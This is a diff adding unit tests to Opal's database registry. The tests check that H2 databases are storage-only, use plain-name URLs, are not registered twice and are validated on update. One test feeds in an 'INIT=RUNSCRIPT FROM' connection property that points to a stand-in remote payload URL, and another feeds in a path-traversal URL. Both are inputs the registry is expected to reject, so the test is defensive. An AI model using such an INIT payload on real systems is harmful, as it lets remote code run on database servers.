@@ -25,6 +25,7 @@ import org.obiba.opal.core.runtime.jdbc.DataSourceFactory;
 import org.obiba.opal.core.service.database.CannotDeleteDatabaseLinkedToDatasourceException;
 import org.obiba.opal.core.service.database.DatabaseRegistry;
 import org.obiba.opal.core.service.database.IdentifiersDatabaseNotFoundException;
+import org.obiba.opal.core.service.database.InvalidH2DatabaseException;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.context.annotation.Bean;
 import org.springframework.context.annotation.Configuration;
@@ -39,6 +40,7 @@ import java.util.List;
 import static com.google.common.collect.Lists.newArrayList;
 import static org.easymock.EasyMock.*;
 import static org.fest.assertions.api.Assertions.assertThat;
+import static org.fest.assertions.api.Assertions.fail;
 import static org.obiba.opal.core.domain.database.Database.Usage;
 
 @ContextConfiguration(classes = DefaultDatabaseRegistryTest.Config.class)
@@ -279,6 +281,105 @@ public class DefaultDatabaseRegistryTest extends AbstractOrientdbServiceTest {
     databaseRegistry.unregister(database.getName(), "jdbc-datasource");
 
     assertThat(databaseRegistry.hasDatasource(database)).isFalse();
+  }
+
+  @Test
+  public void test_new_h2_database() {
+    Database database = createH2Database(Usage.STORAGE, "jdbc:h2:file:opal");
+    databaseRegistry.create(database);
+
+    assertDatabaseEquals(database, databaseRegistry.getDatabase(database.getName()));
+    assertThat(databaseRegistry.listSqlDatabases()).hasSize(1);
+  }
+
+  @Test
+  public void test_h2_database_is_storage_only() {
+    for(Usage usage : new Usage[] { Usage.IMPORT, Usage.EXPORT }) {
+      Database database = createH2Database(usage, "jdbc:h2:file:opal");
+      try {
+        databaseRegistry.create(database);
+        fail("Expected an InvalidH2DatabaseException for usage: " + usage);
+      } catch(InvalidH2DatabaseException ignored) {
+      }
+    }
+    assertThat(databaseRegistry.listSqlDatabases()).isEmpty();
+  }
+
+  @Test
+  public void test_h2_database_url_must_be_a_name() {
+    for(String url : new String[] { "jdbc:h2:file:../escape", "jdbc:h2:file:/var/lib/opal", "jdbc:h2:mem:opal" }) {
+      Database database = createH2Database(Usage.STORAGE, url);
+      try {
+        databaseRegistry.create(database);
+        fail("Expected an InvalidH2DatabaseException for URL: " + url);
+      } catch(InvalidH2DatabaseException ignored) {
+      }
+    }
+    assertThat(databaseRegistry.listSqlDatabases()).isEmpty();
+  }
+
+  @Test
+  public void test_h2_database_rejects_an_init_connection_property() {
+    Database database = createH2Database(Usage.STORAGE, "jdbc:h2:file:opal");
+    database.getSqlSettings().setProperties("INIT=RUNSCRIPT FROM 'https://elsewhere.example/payload.sql'");
+    try {
+      databaseRegistry.create(database);
+      fail("Expected an InvalidH2DatabaseException");
+    } catch(InvalidH2DatabaseException ignored) {
+    }
+    assertThat(databaseRegistry.listSqlDatabases()).isEmpty();
+  }
+
+  @Test
+  public void test_h2_database_file_is_registered_once() {
+    databaseRegistry.create(createH2Database(Usage.STORAGE, "jdbc:h2:file:opal"));
+
+    for(String url : new String[] { "jdbc:h2:file:opal", "jdbc:h2:file:OPAL" }) {
+      Database duplicate = createH2Database(Usage.STORAGE, url);
+      duplicate.setName("another-" + url);
+      try {
+        databaseRegistry.create(duplicate);
+        fail("Expected an InvalidH2DatabaseException for URL: " + url);
+      } catch(InvalidH2DatabaseException ignored) {
+      }
+    }
+    assertThat(databaseRegistry.listSqlDatabases()).hasSize(1);
+  }
+
+  @Test
+  public void test_h2_database_can_be_updated_in_place() {
+    Database database = createH2Database(Usage.STORAGE, "jdbc:h2:file:opal");
+    databaseRegistry.create(database);
+
+    // the database is not a duplicate of itself
+    database.getSqlSettings().setUsername("opal");
+    databaseRegistry.update(database);
+
+    assertThat(databaseRegistry.getDatabase(database.getName()).getSqlSettings().getUsername()).isEqualTo("opal");
+  }
+
+  @Test
+  public void test_h2_database_usage_is_validated_on_update() {
+    Database database = createH2Database(Usage.STORAGE, "jdbc:h2:file:opal");
+    databaseRegistry.create(database);
+
+    database.setUsage(Usage.EXPORT);
+    try {
+      databaseRegistry.update(database);
+      fail("Expected an InvalidH2DatabaseException");
+    } catch(InvalidH2DatabaseException ignored) {
+    }
+    assertThat(databaseRegistry.getDatabase(database.getName()).getUsage()).isEqualTo(Usage.STORAGE);
+  }
+
+  private Database createH2Database(Usage usage, String url) {
+    return createDatabase().usage(usage).defaultStorage(false).sqlSettings(SqlSettings.Builder.create() //
+        .sqlSchema(SqlSettings.SqlSchema.JDBC) //
+        .driverClass("org.h2.Driver") //
+        .url(url) //
+        .username("sa") //
+        .password("password")) //
+        .build();
   }
 
   private Database createSqlDatabase() {
